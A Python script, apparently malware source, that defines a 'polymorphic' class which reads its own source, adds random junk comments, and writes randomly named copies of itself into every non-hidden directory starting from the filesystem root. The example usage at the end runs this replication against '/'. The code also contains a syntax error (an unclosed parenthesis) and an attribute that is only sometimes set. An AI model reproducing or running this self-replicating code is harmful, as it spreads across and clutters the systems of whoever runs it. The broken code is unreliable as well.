import os
import shutil
import abc
import random
import string
import stat

class FileEntity(metaclass=abc.ABCMeta):
    def __init__(self, path):
        self.path = path

    @abc.abstractmethod
    def copy_file(self, target_dir):
        pass

class PolymorphicEntity(FileEntity):
    def __init__(self, path, target_dir_list=None, iteration=None):
        super().__init__(path)
        if target_dir_list is None:
            self.target_dir_list = []
        else:
            self.target_dir_list = target_dir_list
            
        if iteration is None:
            self.iteration = 2

    def copy_file(self, target_dir):
        new_script = self.obfuscate_script()
        new_name = self.generate_random_name()
        new_path = os.path.join(target_dir, new_name)
        with open(new_path, 'w') as f:
            f.write(new_script)

    def list_directories(self, path):
        self.target_dir_list.append(path)
        files_in_current_directory = os.listdir(path)
        
        for file in files_in_current_directory:
            absolute_path = os.path.join(path, file)
            if not self.is_hidden(absolute_path):
                if os.path.isdir(absolute_path):
                    self.list_directories(absolute_path)

    def create_new_entity(self):
        for target_dir in self.target_dir_list:
            self.copy_file(target_dir)

    def is_hidden(self, filepath):
        name = os.path.basename(os.path.abspath(filepath))
        if name.startswith('.'):
            return True
        elif os.name == 'nt':
            attribute = os.stat(filepath).st_file_attributes
            return bool(attribute & stat.FILE_ATTRIBUTE_HIDDEN)
        return False

    def generate_random_name(self):
        random_suffix = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
        base, ext = os.path.splitext(os.path.basename(self.path))
        return f"{base}_{random_suffix}{ext}"

    def obfuscate_script(self):
        with open(self.path, 'r') as f:
            original_script = f.read()

        obfuscated_script = self.insert_random_comments(original_script)
        return obfuscated_script

    def insert_random_comments(self, script):
        lines = script.split('\n')
        obfuscated_lines = []
        
        for line in lines:
            obfuscated_lines.append(line)
            if random.random() < 0.3:
                obfuscated_lines.append(f"# {self.generate_random_comment()}")
        
        return '\n'.join(obfuscated_lines)

    def generate_random_comment(self):
        return ''.join(random.choices(string.ascii_letters + string.digits + ' ', k=20))

class File(FileEntity):
    def __init__(self, path):
        super().__init__(path)

    def copy_file(self, target_dir):
        shutil.copy(self.path, target_dir)

class Directory:
    def __init__(self, path):
        self.path = path
        self.file_entities = []

    def add_file_entity(self, file_entity):
        self.file_entities.append(file_entity)

    def replicate_file_entities(self, target_dir):
        for file_entity in self.file_entities:
            file_entity.copy_file(target_dir)

# Example usage:
entity = PolymorphicEntity(os.path.realpath(__file__)
file1 = File(os.path.join('path', 'to', 'file1'))
file2 = File(os.path.join('path', 'to', 'file2'))

directory = Directory(os.path.join('/'))  # Adjust for Windows if needed
directory.add_file_entity(entity)
directory.add_file_entity(file1)
directory.add_file_entity(file2)

directory.replicate_file_entities(os.path.join('target', 'directory'))
entity.list_directories(os.path.join('/'))
entity.create_new_entity()
